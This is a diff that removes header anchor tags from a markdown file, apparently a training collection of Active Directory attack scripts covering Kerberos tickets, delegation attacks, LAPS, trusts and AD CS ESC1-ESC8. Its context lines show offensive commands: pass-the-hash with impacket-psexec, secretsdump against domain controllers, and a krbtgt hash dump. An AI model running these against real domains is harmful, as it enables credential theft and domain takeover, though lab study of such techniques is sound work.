@@ -61,7 +61,7 @@ evil-winrm -i ws02.corp.local -k                             # the Kerberos path
 
 ---
 
-#### `m12-kerberos-tickets-linux.sh` {#m12-kerberos-tickets-linux-sh}
+#### `m12-kerberos-tickets-linux.sh`
 
 ````bash
 #!/usr/bin/env bash
@@ -555,7 +555,7 @@ Windows side (session host): `m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName W
 
 ---
 
-#### `m12-ad-enum-windows.ps1` {#m12-ad-enum-windows-ps1}
+#### `m12-ad-enum-windows.ps1`
 
 ````powershell
 <#
@@ -1113,7 +1113,7 @@ impacket-psexec -k -no-pass CORP/Administrator@DC01.corp.local -hashes :NTHASH  
 
 ---
 
-#### `m12-delegation-attacks.ps1` {#m12-delegation-attacks-ps1}
+#### `m12-delegation-attacks.ps1`
 
 ````powershell
 <#
@@ -1668,7 +1668,7 @@ impacket-secretsdump -k -no-pass ROOTDC.corp.local
 
 ---
 
-#### `m12-ad-enum-linux.sh` {#m12-ad-enum-linux-sh}
+#### `m12-ad-enum-linux.sh`
 
 ````bash
 #!/usr/bin/env bash
@@ -2063,7 +2063,7 @@ info "next: for LAPS hits see scenario 49; for delegation/RBCD hits see scenario
 info "      for trust + SID hits see scenario 53 (the Extra SID section of m12-laps-and-trust-notes.md)."
 ````
 
-#### `m12-laps-and-trust-notes.md` {#m12-laps-and-trust-notes-md}
+#### `m12-laps-and-trust-notes.md`
 
 ````markdown
 # m12 - reading LAPS, domain/forest trust enumeration, Extra SID and SID filtering command notes
@@ -2432,7 +2432,7 @@ impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC0
 
 ---
 
-#### `m12-adcs-esc1-esc8.sh` {#m12-adcs-esc1-esc8-sh}
+#### `m12-adcs-esc1-esc8.sh`
 
 ````bash
 #!/usr/bin/env bash
